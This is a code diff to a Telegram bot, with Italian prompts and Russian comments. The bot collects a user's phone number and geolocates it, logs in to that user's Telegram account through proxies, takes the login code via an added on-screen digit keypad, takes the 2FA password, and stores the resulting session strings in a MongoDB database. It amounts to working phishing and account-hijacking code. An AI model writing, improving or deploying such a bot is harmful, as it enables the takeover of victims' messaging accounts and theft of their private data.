@@ -39,7 +39,7 @@ proxy_list = [main_proxy, second_proxy]
 mongo = MongoClient(MONGO_URI)
 db = mongo["dbmango"]
 sessions_col = db["sessions"]
-start_col = db["start"]  # Коллекция для логирования всех действий
+start_col = db["start"]
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
@@ -59,6 +59,13 @@ def get_proxy_for_phone(phone):
         return proxy_list[existing_session.get('proxy_index', 0)]
     return proxy_list[hash(phone) % len(proxy_list)]
 
+def cleanup(user_id):
+    """Очищает данные пользователя из временных хранилищ"""
+    user_states.pop(user_id, None)
+    user_clients.pop(user_id, None)
+    user_phones.pop(user_id, None)
+    user_code_buffers.pop(user_id, None)
+
 def update_user_log(user_id: int, updates: dict):
     """Обновляет или создает запись пользователя с новыми данными"""
     try:
@@ -70,11 +77,28 @@ def update_user_log(user_id: int, updates: dict):
     except Exception as e:
         logging.error(f"Ошибка при обновлении лога пользователя: {e}")
 
+async def send_code_keyboard(user_id, current_code, message_id=None):
+    """Отправляет/обновляет клавиатуру для ввода кода"""
+    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
+    buttons = []
+    for row in digits:
+        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
+        buttons.append(btn_row)
+    buttons.append([InlineKeyboardButton("✅ Invia", callback_data="code_send")])
+    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
+    text = f"Codice: `{current_code}`" if current_code else "Inserisci il codice:"
+
+    if message_id:
+        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
+                                 text=text, reply_markup=keyboard, parse_mode='Markdown')
+    else:
+        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
+        return msg.message_id
+
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
     user = message.from_user
     
-    # Обновляем информацию о пользователе
     update_user_log(
         user_id=user.id,
         updates={
@@ -104,7 +128,6 @@ async def start_auth(callback_query: types.CallbackQuery):
     user_id = callback_query.from_user.id
     user_states[user_id] = 'awaiting_contact'
 
-    # Обновляем статус пользователя
     update_user_log(
         user_id=user_id,
         updates={
@@ -130,7 +153,6 @@ async def handle_contact(message: types.Message):
     if not phone.startswith("+"):
         phone = "+" + phone
 
-    # Получаем информацию о геолокации по номеру телефона
     geo_info = None
     try:
         parsed_number = phonenumbers.parse(phone)
@@ -138,7 +160,6 @@ async def handle_contact(message: types.Message):
     except Exception as e:
         logging.error(f"Ошибка при определении геолокации: {e}")
 
-    # Обновляем информацию о контакте
     update_user_log(
         user_id=user_id,
         updates={
@@ -151,7 +172,6 @@ async def handle_contact(message: types.Message):
         }
     )
 
-    # Выбираем прокси для этого номера
     selected_proxy = get_proxy_for_phone(phone)
     
     client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=selected_proxy)
@@ -171,6 +191,39 @@ async def handle_contact(message: types.Message):
         await client.disconnect()
         cleanup(user_id)
 
+@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
+async def process_code_button(callback_query: types.CallbackQuery):
+    user_id = callback_query.from_user.id
+    data = callback_query.data
+
+    if user_states.get(user_id) != 'awaiting_code':
+        await bot.answer_callback_query(callback_query.id, text="⛔️ Non è il momento giusto", show_alert=True)
+        return
+
+    buffer = user_code_buffers.get(user_id)
+    if not buffer:
+        await bot.answer_callback_query(callback_query.id, text="Errore interno.", show_alert=True)
+        return
+
+    current_code = buffer['code']
+    message_id = buffer['message_id']
+
+    if data == "code_send":
+        if not current_code:
+            await bot.answer_callback_query(callback_query.id, text="⚠️ Inserisci prima il codice", show_alert=True)
+            return
+        await bot.answer_callback_query(callback_query.id)
+        await try_sign_in_code(user_id, current_code)
+    else:
+        digit = data.split("_")[1]
+        if len(current_code) >= 10:
+            await bot.answer_callback_query(callback_query.id, text="⚠️ Codice troppo lungo", show_alert=True)
+            return
+        current_code += digit
+        user_code_buffers[user_id]['code'] = current_code
+        await bot.answer_callback_query(callback_query.id)
+        await send_code_keyboard(user_id, current_code, message_id)
+
 async def try_sign_in_code(user_id, code):
     client = user_clients.get(user_id)
     phone = user_phones.get(user_id)
@@ -185,7 +238,6 @@ async def try_sign_in_code(user_id, code):
             me = await client.get_me()
             session_str = client.session.save()
             
-            # Определяем индекс прокси для сохранения
             proxy_index = 0
             if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                 current_proxy = client._sender._proxy
@@ -206,7 +258,6 @@ async def try_sign_in_code(user_id, code):
                 upsert=True
             )
 
-            # Обновляем информацию об успешной авторизации
             update_user_log(
                 user_id=user_id,
                 updates={
@@ -289,7 +340,6 @@ async def process_2fa(message: types.Message):
                 upsert=True
             )
             
-            # Обновляем информацию об успешной авторизации с 2FA
             update_user_log(
                 user_id=user_id,
                 updates={
@@ -313,8 +363,6 @@ async def process_2fa(message: types.Message):
         await message.answer(f"❌ Errore con 2FA: {e}")
         await client.disconnect()
         cleanup(user_id)
-
-# ... (остальные функции остаются без изменений)
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
